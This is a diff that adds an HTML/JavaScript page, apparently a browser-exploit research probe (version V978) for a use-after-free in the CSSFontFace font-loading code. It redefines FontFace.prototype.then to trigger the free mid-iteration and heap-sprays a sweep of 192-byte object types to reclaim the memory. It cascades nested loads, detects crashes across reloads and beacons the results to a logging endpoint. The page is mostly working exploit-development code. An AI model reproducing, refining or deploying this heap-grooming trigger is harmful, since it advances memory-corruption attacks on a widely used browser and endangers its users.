@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V978 - FontFace writeback: corrected cascade / type-reclaim / promise / timer</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V978 - CSSFontFace UAF: corrected amplification sweep on 14.20</h1>
+
+<p class="key">
+<b>Why V978:</b> V977 produced 679 beacons but only 2 of its 5 hypotheses actually ran. This probe fixes
+the three probe bugs and makes the timer test real.
+<b>Corrections vs V977:</b>
+(1) <b>Cascade is now real</b> - the nested <code>face.load()</code> executes <i>inside</i> the
+<code>FontFace.prototype.then</code> getter, chaining up to 3 victims while the outer
+<code>iterateClients()</code> loop is still on the stack.
+(2) <b>Type rotation now works</b> - <code>typeidx</code> is read from and written to
+<code>localStorage</code>, so each reload tests a different 192B-class allocation family, sprayed
+<i>inside</i> the getter (the actual reclaim window) instead of after the tail.
+(3) <b>Promise race now reports</b> - per-face IIFE capture fixes the <code>var h</code> closure that
+swallowed every beacon.
+(4) <b>Timer test is real</b> - <code>case=timer</code> sprays faces with a black-hole
+<code>url(http://192.0.2.1/...)</code> src and calls <code>load()</code>, so their internal 3 s
+<code>CSSFontFace</code> timeout is armed. After 6.5 s: a hit face still <code>loaded</code> means the
+tail's <code>m_timeoutTimer.stop()</code> killed the timeout; <code>error</code> means it did not;
+<code>loading</code> means no writeback landed.
+<b>Cases:</b> <code>all|cascade|types|promise|timer|status</code> (default all = cascade+types+promise+status).
+<code>&amp;k=N</code> spray count (64), <code>&amp;arm=0</code> control, <code>&amp;stop=1</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var Q = function (k, d) { var m = location.search.match(new RegExp('[?&]' + k + '=(\\d+)')); return m ? parseInt(m[1], 10) : d; };
+var CASE = (location.search.match(/case=(all|timer|status|cascade|types|promise)/) || [])[1] || 'all';
+var K = Math.min(Math.max(Q('k', 64), 8), 256);
+var ARM = location.search.indexOf('arm=0') < 0;
+var STOP = location.search.indexOf('stop=1') >= 0;
+var MAXLOADS = 8;
+var KSUF = Date.now().toString(36).slice(-5) + Math.random().toString(36).slice(2, 5);
+var FAMILY = 'v978v' + KSUF;
+var KFAMPREFIX = 'v978k' + KSUF;
+var SCANNED = false;
+var LIVE_TRIGGER = false;
+
+function lsGet(k) { try { return window.localStorage.getItem('v978_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v978_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v978_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V978-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 80) : 'none'; }
+function reloadSoon(ms) {
+  if (STOP) { bks('STOPPED', 'no reload (stop=1)'); return; }
+  setTimeout(function () {
+    location.href = SEEK + '?op=auto&case=' + CASE + '&k=' + K + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+  }, ms);
+}
+
+var VICT = [], KFACES = [], TYPEHOLD = [], TYPEBASE = [], TYPEFAM = null;
+var TRIG_FIRED = 0, STAGE_DONE = 0;
+var HANGURL = 'http://192.0.2.1/v978hang.woff';
+
+function findCssFace(family) {
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      if (String(e.value.family).replace(/['"]/g, '') === family) return e.value;
+    }
+  } catch (e2) {}
+  return null;
+}
+
+function makeVictim(i) {
+  var fam = FAMILY + 'v' + i;
+  var st = document.createElement('style');
+  st.id = 'v978style' + i;
+  st.textContent = "@font-face { font-family: '" + fam + "'; src: local('Arial'); }";
+  document.head.appendChild(st);
+  document.body.offsetHeight;
+  var f = findCssFace(fam);
+  return { style: st, face: f, fam: fam, removed: false };
+}
+
+/* ---------- allocation families for the 192B-class reclaim sweep ---------- */
+
+var TYPE_FAMILIES = [
+  { n: 'string8', make: function (i) {
+      var s = '', j;
+      for (j = 0; j < 176; j++) s += String.fromCharCode(65 + ((j + i) & 15));
+      return s;
+    }, sig: function (o) { return o.length + ':' + o.charCodeAt(0) + ':' + o.charCodeAt(88) + ':' + o.charCodeAt(175); } },
+  { n: 'string16', make: function (i) {
+      var s = '', j;
+      for (j = 0; j < 88; j++) s += String.fromCharCode(0x1234 + ((j + i) & 15));
+      return s;
+    }, sig: function (o) { return o.length + ':' + o.charCodeAt(0) + ':' + o.charCodeAt(44) + ':' + o.charCodeAt(87); } },
+  { n: 'ab176', make: function (i) {
+      var a = new ArrayBuffer(176), v = new Uint8Array(a), j;
+      for (j = 0; j < 176; j++) v[j] = (j + i) & 255;
+      return a;
+    }, sig: function (o) { var v = new Uint8Array(o); return o.byteLength + ':' + v[0] + ':' + v[88] + ':' + v[175]; } },
+  { n: 'u8-176', make: function (i) {
+      var v = new Uint8Array(176), j;
+      for (j = 0; j < 176; j++) v[j] = (j * 3 + i) & 255;
+      return v;
+    }, sig: function (o) { return o.length + ':' + o[0] + ':' + o[88] + ':' + o[175]; } },
+  { n: 'map', make: function (i) {
+      var m = new Map(), j;
+      for (j = 0; j < 20; j++) m.set('k' + j, j + i);
+      return m;
+    }, sig: function (o) { return o.size + ':' + o.get('k0') + ':' + o.get('k10') + ':' + o.get('k19'); } },
+  { n: 'set', make: function (i) {
+      var s = new Set(), j;
+      for (j = 0; j < 20; j++) s.add('v' + j + '_' + i);
+      return s;
+    }, sig: function (o) { return o.size + ':' + o.has('v0_' + 0) + ':' + o.has('v19_' + 19); } },
+  { n: 'urlsp', make: function (i) {
+      return new URLSearchParams('a=1&b=2&c=3&d=4&e=5&f=6&g=7&h=8&i=' + i);
+    }, sig: function (o) { return o.toString().length + ':' + o.get('a') + ':' + o.get('i'); } },
+  { n: 'headers', make: function (i) {
+      try { return new Headers({ a: '1', b: '2', c: '3', d: '4', e: '5' }); } catch (e) { return null; }
+    }, sig: function (o) { return o.get('a') + ':' + o.get('d') + ':' + o.get('e'); } },
+  { n: 'formdata', make: function (i) {
+      var fd = new FormData(), j;
+      for (j = 0; j < 8; j++) fd.append('k' + j, 'v' + j + '_' + i);
+      return fd;
+    }, sig: function (o) { return o.get('k0') + ':' + o.get('k7'); } },
+  { n: 'imagedata', make: function (i) {
+      var c = document.createElement('canvas'); c.width = 8; c.height = 6;
+      var x = c.getContext('2d'); return x.createImageData(8, 6);
+    }, sig: function (o) { return o.width + 'x' + o.height + ':' + o.data.length + ':' + o.data[0] + ':' + o.data[o.data.length - 1]; } },
+  { n: 'arrayobj', make: function (i) {
+      var a = new Array(22), j;
+      for (j = 0; j < 22; j++) a[j] = { x: j + i, y: 'p' + j };
+      return a;
+    }, sig: function (o) { return o.length + ':' + o[0].x + ':' + o[21].x + ':' + o[21].y; } },
+  { n: 'arraydbl', make: function (i) {
+      var a = new Array(24), j;
+      for (j = 0; j < 24; j++) a[j] = j + i + 0.5;
+      return a;
+    }, sig: function (o) { return o.length + ':' + o[0] + ':' + o[23]; } },
+  { n: 'blob', make: function (i) {
+      var parts = [], j;
+      for (j = 0; j < 8; j++) parts.push('chunk' + j + '_' + i + ';');
+      return new Blob(parts, { type: 'text/plain' });
+    }, sig: function (o) { return o.size + ':' + o.type; } },
+  { n: 'regexp', make: function (i) {
+      return new RegExp('a' + i + '(b|c){2,4}[0-9]+', 'gi');
+    }, sig: function (o) { return o.source.length + ':' + o.flags; } },
+  { n: 'styleattr', make: function (i) {
+      var d = document.createElement('div'), j;
+      for (j = 0; j < 24; j++) d.style.setProperty('--p' + j, 'v' + j + '_' + i);
+      return d;
+    }, sig: function (o) { return o.getAttribute('style').length + ':' + o.style.getPropertyValue('--p0'); } }
+];
+
+function typeIdx() {
+  var t = parseInt(lsGet('typeidx') || '0', 10);
+  var m = location.search.match(/typeidx=(\d+)/);
+  if (m) t = parseInt(m[1], 10);
+  return isNaN(t) ? 0 : t;
+}
+function bumpTypeIdx() { lsSet('typeidx', String((typeIdx() + 1) % TYPE_FAMILIES.length)); }
+
+function doTypeSpray(stage) {
+  var ti = typeIdx() % TYPE_FAMILIES.length;
+  var fam = TYPE_FAMILIES[ti];
+  var hold = [], sigs = [], made = 0, errs = 0, i, o;
+  for (i = 0; i < 256; i++) {
+    try {
+      o = fam.make(i);
+      if (o == null) continue;
+      hold.push(o); sigs.push(fam.sig(o)); made++;
+    } catch (e) {
+      errs++;
+      if (errs < 3) bks('TYPEERR', 'type=' + fam.n + ',i=' + i + ',' + errOf(e));
+    }
+  }
+  TYPEHOLD = hold; TYPEBASE = sigs; TYPEFAM = fam;
+  bks('TYPEWAVE', 'type=' + fam.n + ',idx=' + ti + ',made=' + made + ',errs=' + errs + ',stage=' + stage);
+  bumpTypeIdx();
+}
+
+function typeCheck() {
+  if (!TYPEFAM || !TYPEHOLD.length) return;
+  var diffs = [], errs = 0, i, s;
+  for (i = 0; i < TYPEHOLD.length; i++) {
+    try {
+      s = TYPEFAM.sig(TYPEHOLD[i]);
+      if (s !== TYPEBASE[i]) diffs.push(i + ':' + TYPEBASE[i] + '->' + s);
+    } catch (e) {
+      errs++;
+      if (diffs.length < 6) diffs.push(i + ':ERR:' + errOf(e));
+    }
+  }
+  bks('TYPECHECK', 'type=' + TYPEFAM.n + ',n=' + TYPEHOLD.length + ',diffs=' + diffs.length +
+      ',errs=' + errs + (diffs.length ? ',d=' + diffs.slice(0, 5).join('|') : ''));
+}
+
+/* ---------- face spray (real reclaim population) ---------- */
+
+function doFaceSpray(stage, n) {
+  var faces = [], made = 0, i, f, src;
+  for (i = 0; i < n; i++) {
+    try {
+      if (CASE === 'timer') {
+        src = 'url("' + HANGURL + '?i=' + i + '")';
+        f = new FontFace(KFAMPREFIX + 's' + stage + '_' + i, src);
+      } else {
+        f = new FontFace(KFAMPREFIX + 's' + stage + '_' + i, 'local("Nope' + KSUF + i + '")');
+      }
+      document.fonts.add(f);
+      if (CASE === 'timer') { try { f.load(); } catch (e3) {} }
+      faces.push(f); made++;
+    } catch (e) {
+      bks('SPRAYERR', 'stage=' + stage + ',i=' + i + ',' + errOf(e));
+      break;
+    }
+  }
+  KFACES = KFACES.concat(faces);
+  bks('FACEWAVE', 'stage=' + stage + ',k=' + n + ',made=' + made);
+}
+
+/* ---------- the trigger: everything happens inside the getter ---------- */
+
+function installGetter() {
+  try {
+    Object.defineProperty(FontFace.prototype, 'then', {
+      get: function () {
+        if (!LIVE_TRIGGER) return undefined;
+        TRIG_FIRED++;
+        var stage = TRIG_FIRED;
+        if (stage > 3) return undefined;
+        if (!ARM) {
+          if (stage === 1) {
+            var vv = VICT[0];
+            bks('TRIG', 'case=' + CASE + ',status=' + (vv && vv.face ? vv.face.status : '?') + ',arm=0');
+          }
+          return undefined;
+        }
+        STAGE_DONE = stage;
+        try {
+          var v = VICT[stage - 1];
+          bks('CASCADE-STAGE', 'stage=' + stage + ',victim=' + (v ? v.fam : '?') +
+              ',status=' + (v && v.face ? v.face.status : '?'));
+          if (v && v.style && v.style.parentNode && !v.removed) {
+            v.style.parentNode.removeChild(v.style);
+            v.removed = true;
+            document.body.offsetHeight;
+          }
+          if (CASE === 'types') doTypeSpray(stage);
+          else doFaceSpray(stage, stage === 1 ? K : (stage === 2 ? 32 : 16));
+
+          if ((CASE === 'cascade' || CASE === 'all') && stage < 3 && VICT[stage] && VICT[stage].face) {
+            var r, threw = 'none';
+            try { r = VICT[stage].face.load(); }
+            catch (e2) { threw = errOf(e2); }
+            bks('CASCADE-NEST', 'stage=' + stage + ',next=' + (stage + 1) +
+                ',ret=' + (r && r.constructor ? r.constructor.name : typeof r) + ',threw=' + threw);
+          }
+        } catch (e) { bks('TRIGERR', 'stage=' + stage + ',' + errOf(e)); }
+        return undefined;
+      },
+      configurable: true
+    });
+  } catch (e) { bks('ERR', 'defineProperty:' + errOf(e)); }
+}
+
+function safeProp(obj, name) {
+  try { var v = obj[name]; return (v == null) ? String(v) : String(v).slice(0, 60); }
+  catch (e) { return 'ERR:' + errOf(e); }
+}
+
+/* ---------- H2: status-driven behaviour oracle ---------- */
+
+function testStatusOracle(hitFaces) {
+  var baseline = null, it, e, f;
+  try {
+    it = document.fonts.values();
+    while (!(e = it.next()).done) {
+      f = e.value;
+      var fam = String(f.family).replace(/['"]/g, '');
+      if (fam.indexOf(KFAMPREFIX) === 0 && String(f.status) === 'unloaded') { baseline = f; break; }
+    }
+  } catch (e2) {}
+
+  function probe(label, face, idx) {
+    if (!face) return;
+    var t0 = performance.now();
+    var status1 = safeProp(face, 'status');
+    var p;
+    try { p = face.load(); }
+    catch (e) { bks(label + '-LOADERR', 'idx=' + idx + ',' + errOf(e)); return; }
+    var t1 = performance.now();
+    try {
+      p.then(
+        function () { bks(label + '-THEN', 'idx=' + idx + ',status=' + status1 + ',dt=' + (performance.now() - t0).toFixed(3)); },
+        function (r) { bks(label + '-CATCH', 'idx=' + idx + ',status=' + status1 + ',dt=' + (performance.now() - t0).toFixed(3) + ',reason=' + String(r).slice(0, 40)); }
+      );
+    } catch (e) { bks(label + '-ATTACHERR', 'idx=' + idx + ',' + errOf(e)); }
+    try {
+      var chk = document.fonts.check('16px "' + safeProp(face, 'family') + '"');
+      bks(label + '-CHECK', 'idx=' + idx + ',check=' + chk + ',dt=' + (t1 - t0).toFixed(3));
+    } catch (e) { bks(label + '-CHECKERR', 'idx=' + idx + ',' + errOf(e)); }
+  }
+
+  for (var h = 0; h < hitFaces.length && h < 3; h++) probe('HIT', hitFaces[h].f, hitFaces[h].idx);
+  if (baseline) probe('BASE', baseline, '-');
+}
+
+/* ---------- H5: promise-state leak (IIFE fixes the closure) ---------- */
+
+function testPromiseLeak(hitFaces) {
+  for (var h = 0; h < hitFaces.length && h < 3; h++) {
+    (function (face, idx) {
+      var t0 = performance.now();
+      var p;
+      try { p = face.loaded; }
+      catch (e) { bks('PROMISE-ERR', 'idx=' + idx + ',loaded:' + errOf(e)); return; }
+      try {
+        Promise.race([p, Promise.resolve('__marker__')]).then(
+          function (v) { bks('PROMISE-RACE', 'idx=' + idx + ',src=loaded,first=' + (v === '__marker__' ? 'pending' : 'settled') + ',dt=' + (performance.now() - t0).toFixed(3)); },
+          function (r) { bks('PROMISE-RACE', 'idx=' + idx + ',src=loaded,first=rejected,dt=' + (performance.now() - t0).toFixed(3) + ',reason=' + String(r).slice(0, 30)); }
+        );
+      } catch (e2) { bks('PROMISE-ERR', 'idx=' + idx + ',race:' + errOf(e2)); }
+
+      var t1 = performance.now();
+      var p2;
+      try { p2 = face.load(); }
+      catch (e3) { bks('PROMISE-ERR', 'idx=' + idx + ',load:' + errOf(e3)); return; }
+      try {
+        Promise.race([p2, Promise.resolve('__marker2__')]).then(
+          function (v) { bks('PROMISE-RACE', 'idx=' + idx + ',src=load,first=' + (v === '__marker2__' ? 'pending' : 'settled') + ',dt=' + (performance.now() - t1).toFixed(3)); },
+          function (r) { bks('PROMISE-RACE', 'idx=' + idx + ',src=load,first=rejected,dt=' + (performance.now() - t1).toFixed(3) + ',reason=' + String(r).slice(0, 30)); }
+        );
+      } catch (e4) { bks('PROMISE-ERR', 'idx=' + idx + ',race2:' + errOf(e4)); }
+    })(hitFaces[h].f, hitFaces[h].idx);
+  }
+}
+
+/* ---------- H1: real internal-timer test (case=timer only) ---------- */
+
+function testTimerChannel(hitFaces) {
+  var i, f, st = [], hitStat = [];
+  for (i = 0; i < KFACES.length && i < 40; i++) {
+    f = KFACES[i];
+    try { st.push(String(f.status).charAt(0)); } catch (e) { st.push('?'); }
+  }
+  for (i = 0; i < hitFaces.length && i < 3; i++) hitStat.push(hitFaces[i].idx + ':' + safeProp(hitFaces[i].f, 'status'));
+  bks('TIMER', 'hit=' + hitFaces.length + ',hitStat=' + hitStat.join('|') +
+      ',sprayStatuses=' + st.join('') +
+      ',ctrl=' + (window.__v978ctrl ? window.__v978ctrl() : '?'));
+}
+
+/* ---------- scan ---------- */
+
+function scanFaces() {
+  var hits = [], total = 0, other = [], hitFaces = [];
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      var f = e.value;
+      var fam = String(f.family).replace(/['"]/g, '');
+      if (fam.indexOf(KFAMPREFIX) !== 0) continue;
+      total++;
+      var s = String(f.status);
+      var idxStr = fam.slice(KFAMPREFIX.length);
+      if (s === 'loaded' || s === 'error') { hits.push(idxStr + ':' + s); hitFaces.push({ f: f, idx: idxStr, s: s }); }
+      else if (s !== 'unloaded') other.push(idxStr + ':' + s);
+    }
+  } catch (e2) { bks('FSCANERR', errOf(e2)); }
+  var stages = {};
+  for (var i = 0; i < hits.length; i++) {
+    var m = /^s(\d+)_/.exec(hits[i]);
+    if (m) stages[m[1]] = (stages[m[1]] || 0) + 1;
+  }
+  bks('FACESCAN', 'case=' + CASE + ',k=' + K + ',total=' + total + ',hits=' + hits.length +
+      ',other=' + other.length + ',stageHits=' + JSON.stringify(stages) +
+      ',trig=' + TRIG_FIRED + ',victimFace=' + (VICT[0] && VICT[0].face ? VICT[0].face.status : '?') +
+      ',fonts=' + (function () { try { return document.fonts.size; } catch (e3) { return '?'; } })());
+  if (hits.length) bks('HIT', 'STATUS-WRITEBACK:' + hits.join('|').slice(0, 380));
+  else bks('NOHIT', 'no sprayed face left unloaded/loading');
+  if (other.length) bks('FOTHER', other.join('|').slice(0, 300));
+
+  if (CASE === 'types') typeCheck();
+
+  if (ARM && hits.length) {
+    if (CASE === 'all' || CASE === 'status') testStatusOracle(hitFaces);
+    if (CASE === 'all' || CASE === 'promise') testPromiseLeak(hitFaces);
+    if (CASE === 'timer') testTimerChannel(hitFaces);
+  }
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+function main() {
+  if (location.search.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('tries'); lsDel('phase'); lsDel('typeidx');
+    bks('RESET', 'cleared,case=' + CASE);
+    say('cleared. reopening in 1.5s...');
+    setTimeout(function () {
+      location.href = SEEK + '?op=auto&case=' + CASE + '&k=' + K + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+    }, 1500);
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > MAXLOADS) {
+    lsSet('phase', 'done');
+    bks('GIVEUP', 'loads=' + loads + ',case=' + CASE + ',k=' + K);
+    say('give up (phase=done) - reset with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    bks('CRASH', 'pending=' + pend + ',try=' + triesOf() + ',load=' + loads + ',case=' + CASE);
+    say('CRASH pending=' + pend);
+    reloadSoon(4000); return;
+  }
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var tryN = bumpTry();
+  bks('ENV', 'case=' + CASE + ',k=' + K + ',arm=' + (ARM ? 1 : 0) + ',try=' + tryN + ',load=' + loads +
+      ',typeidx=' + (typeIdx() % TYPE_FAMILIES.length) + ',devMs=' + Date.now() +
+      ',ua=' + navigator.userAgent.slice(0, 90));
+  bks('BOOT', 'load=' + loads + ',try=' + tryN + ',family=' + FAMILY);
+
+  /* victims: one per cascade stage */
+  var nVict = (CASE === 'cascade' || CASE === 'all') ? 3 : 1;
+  VICT = [];
+  for (var i = 0; i < nVict; i++) {
+    var v = makeVictim(i);
+    if (!v.face) { bks('ERR', 'NO-FACE stage=' + i); reloadSoon(4000); return; }
+    VICT.push(v);
+  }
+  bks('SETUP', 'victims=' + VICT.length + ',status=' + VICT.map(function (x) { return x.face.status; }).join(','));
+
+  /* timer control group: same hanging URL, allocated BEFORE the free, never reclaimed */
+  if (CASE === 'timer') {
+    var ctrl = [];
+    for (var c = 0; c < 4; c++) {
+      try {
+        var cf = new FontFace(KFAMPREFIX + 'ctrl' + c, 'url("' + HANGURL + '?c=' + c + '")');
+        document.fonts.add(cf);
+        try { cf.load(); } catch (e0) {}
+        ctrl.push(cf);
+      } catch (e) {}
+    }
+    window.__v978ctrl = function () {
+      var s = [], j;
+      for (j = 0; j < ctrl.length; j++) { try { s.push(String(ctrl[j].status).charAt(0)); } catch (e) { s.push('?'); } }
+      return s.join('');
+    };
+  }
+
+  installGetter();
+
+  lsSet('pending', 'v978:case=' + CASE + ':try=' + tryN + ':devMs=' + Date.now());
+  bks('LOADPRE', 'eager-loaded-access then face.load');
+
+  var p;
+  try {
+    var eager = VICT[0].face.loaded;
+    bks('EAGER', 'face.loaded accessed,type=' + (eager && eager.constructor ? eager.constructor.name : typeof eager));
+    LIVE_TRIGGER = true;
+    p = VICT[0].face.load();
+    LIVE_TRIGGER = false;
+  } catch (e) {
+    LIVE_TRIGGER = false;
+    lsDel('pending'); bks('LOADERR', errOf(e)); reloadSoon(4000); return;
+  }
+
+  function after() {
+    if (SCANNED) return;
+    SCANNED = true;
+    try {
+      bks('DONE', 'try=' + tryN + ' complete,trig=' + TRIG_FIRED + ',stages=' + STAGE_DONE + ',case=' + CASE);
+      say('done trig=' + TRIG_FIRED + ' stages=' + STAGE_DONE);
+      /* timer case needs to outlive the internal 3 s font timeout */
+      var wait = (CASE === 'timer') ? 6500 : 500;
+      setTimeout(function () {
+        try { scanFaces(); } catch (e1) { bks('SCANERR', errOf(e1)); }
+        try { delete FontFace.prototype.then; } catch (e2) {}
+        setTimeout(function () {
+          lsDel('pending');
+          bks('RELEASED', 'pending cleared after grace');
+          reloadSoon(300);
+        }, 1500);
+      }, wait);
+    } catch (e) {
+      bks('FATAL', errOf(e)); lsDel('pending'); reloadSoon(4000);
+    }
+  }
+
+  try { p.then(after, after); } catch (e) { try { p.then(after)['catch'](after); } catch (e2) { after(); } }
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
